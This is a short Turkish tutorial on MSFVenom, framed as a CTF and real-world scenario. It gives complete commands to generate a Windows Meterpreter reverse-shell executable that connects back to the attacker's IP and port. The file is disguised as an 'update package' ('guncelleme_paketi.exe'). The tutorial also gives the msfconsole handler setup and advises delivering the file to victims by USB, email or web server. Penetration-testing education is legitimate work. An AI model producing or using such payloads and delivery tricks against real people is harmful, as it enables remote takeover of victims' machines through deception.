
# MSFVenom ve Bağımsız Zararlı Yazılım (Payload) Üretimi


MSFVenom, eski Metasploit araçları olan `msfpayload` (zararlı kod üretici) ve `msfencode` (antivirüs atlatıcı/kodlayıcı) araçlarının tek bir çatı altında birleştirilmiş, son derece hızlı ve standartlaştırılmış halidir.

MSFConsole'un (terminalin) içine girmeden, doğrudan Linux komut satırından çalıştırılır ve Windows, Linux, Mac, Android, PHP, ASPX gibi neredeyse her platform için bağımsız virüsler/arka kapılar üretebilir.

## 1. Temel MSFVenom Söz Dizimi (Syntax)

En temel kullanım şekli ve parametrelerin anlamı şudur:
```bash
msfvenom -p <payload> LHOST=<kendi_ip_adresiniz> LPORT=<dinleme_portu> -f <format> -o <dosya_adi>
````

**Kritik Parametreler:**

- **`-p` (Payload):** Hedefe yerleştirmek istediğiniz zararlı kodun türü. (Örn: `windows/meterpreter/reverse_tcp`)
    
- **`LHOST` ve `LPORT`:** Hedefin zararlı dosyayı çalıştırdığında kime (saldırgana) geri döneceğini belirten IP adresi ve port numarası.
    
- **`-f` (Format):** Çıktının hangi formatta olacağı. (Örn: Windows için `exe`, Linux için `elf`, Android için `apk`, web sunucuları için `php` veya belleğe enjekte etmek için `raw` / `c` / `python`).
    
- **`-o` (Output):** Oluşturulan zararlı yazılımın kaydedileceği dosya adı ve yolu.
    

---

## 2. CTF ve Gerçek Dünya Senaryosu (Windows Ters Bağlantı)

Hedef bir Windows makinesi için Meterpreter ters bağlantı (Reverse Shell) sağlayan bir `.exe` dosyası üretmek istiyoruz:

### Adım 1: Zararlı Yazılımı Üretme (Saldırgan Makinesi)

Terminalde şu komutu çalıştırarak virüsümüzü oluşturuyoruz:


```Bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.5.187 LPORT=1337 -f exe -o guncelleme_paketi.exe
```

### Adım 2: Dinleyiciyi (Handler) Hazırlama (Çok Önemli!)

MSFVenom sadece dosyayı üretir. Dosya hedefte çalıştığında gelen bağlantıyı "yakalamak" için MSFConsole içinde bir dinleyici (Listener/Handler) açmak **zorundasınız**. Aksi takdirde kurban dosyaya tıklasa bile bağlantı boşa düşer.

MSFConsole'u açıp şu komutları giriyoruz:

```Bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.20.5.187
set LPORT 1337
run
```

### Adım 3: Hedefin Oltaya Düşmesi

Oluşturduğumuz `guncelleme_paketi.exe` dosyasını (USB, e-posta, web sunucusu vb. yollarla) hedef Windows makinesine ulaştırıyoruz. Kurban dosyaya çift tıkladığı anda, MSFConsole ekranımızda o sihirli yazı belirir: `Meterpreter session 1 opened`